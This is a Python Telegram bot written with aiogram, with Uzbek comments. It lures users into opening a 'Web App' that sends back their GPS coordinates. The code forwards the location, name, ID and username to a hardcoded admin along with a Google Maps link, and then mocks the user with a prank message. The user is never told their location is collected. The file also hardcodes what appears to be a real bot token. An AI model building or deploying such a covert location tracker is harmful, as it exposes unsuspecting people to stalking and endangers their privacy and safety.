import logging
import asyncio
import json
from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart
from aiogram.utils.keyboard import ReplyKeyboardBuilder

BOT_TOKEN = "8584054517:AAEWqooxcpZfzcCbZxhzSdz0NluStCl_uJY"
ADMIN_ID = 8513245980 # O'zingizning Telegram ID'ingiz

# Web App yuklangan HTTPS havola (Link)
# Hozircha test qilish uchun o'zingiz yuklagan manzilni yozasiz
WEB_APP_URL = "https://your-domain.com/index.html"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


@dp.message(CommandStart())
async def command_start_handler(message: types.Message):
    builder = ReplyKeyboardBuilder()

    # Web App ochadigan maxsus tugma yaratamiz
    builder.row(
        types.KeyboardButton(
            text="Web App",
            web_app=types.WebAppInfo(url=WEB_APP_URL)
        )
    )

    await message.answer(
        f"Salom, {message.from_user.full_name}!\n"
        "Salom tizimdaan foydalanish uchun pastdagi tugma orqali Web App sahifasiga kiring:",
        reply_markup=builder.as_markup(resize_keyboard=True)
    )


# Web App ichidan tg.sendData() orqali yuborilgan ma'lumotni ushlash
@dp.message(lambda message: message.web_app_data is not None)
async def handle_web_app_data(message: types.Message):
    # Kelgan ma'lumotni JSON formatdan Python lug'atiga (dict) o'giramiz
    data = json.loads(message.web_app_data.data)
    lat = data.get("lat")
    lon = data.get("lon")

    user_id = message.from_user.id
    username = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"

    # Foydalanuvchiga yupanch xabari
    await message.answer(" Voy Elbek seni shoxjahon chu tushurdi")

    # Adminga koordinatalarni yuborish
    admin_text = (
        "🎯 **Web App orqali kelgan koordinata!**\n\n"
        f"👤 **Ism:** {message.from_user.full_name}\n"
        f"🆔 **ID:** `{user_id}`\n"
        f"🌐 **Username:** {username}\n\n"
        f"📍 **Latitude:** `{lat}`\n"
        f"📍 **Longitude:** `{lon}`\n\n"
        f"🔗 [Google Maps'da ko'rish](https://www.google.com/maps?q={lat},{lon})"
    )

    await bot.send_message(chat_id=ADMIN_ID, text=admin_text, parse_mode="Markdown")


async def main():
    print("Web App ulanishiga tayyor bot ishga tushdi...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())